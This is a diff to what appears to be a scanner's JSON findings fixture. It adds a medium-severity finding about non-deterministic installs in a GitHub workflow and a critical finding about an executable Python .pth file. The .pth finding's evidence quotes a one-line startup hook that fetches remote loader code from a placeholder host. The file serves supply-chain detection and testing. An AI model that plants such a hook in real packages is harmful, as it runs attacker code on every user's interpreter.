@@ -28,6 +28,26 @@
       "file": ".github/workflows/ci.yml",
       "evidence": "pull_request_target",
       "remediation": "Use pull_request for untrusted code, or split privileged release automation into a separate trusted workflow."
+    },
+    {
+      "id": "risk.github.nondeterministic-install",
+      "title": "Workflow uses a non-deterministic install command",
+      "severity": "medium",
+      "confidence": "high",
+      "ecosystem": "github-actions",
+      "file": ".github/workflows/bun-ci.yml",
+      "evidence": "install command without frozen lockfile or hash enforcement",
+      "remediation": "Use npm ci, yarn install --immutable, pnpm install --frozen-lockfile, bun ci, bun install --frozen-lockfile, or pip install --require-hashes."
+    },
+    {
+      "id": "risk.pypi.pth-exec",
+      "title": "Python .pth file executes code during interpreter startup",
+      "severity": "critical",
+      "confidence": "medium",
+      "ecosystem": "pip",
+      "file": "src/evil.pth",
+      "evidence": "import urllib.request; urllib.request.urlopen('https://example.invalid/loader.py')",
+      "remediation": "Remove unexpected .pth executable code and rebuild the virtual environment from trusted, hashed requirements."
     }
   ]
 }
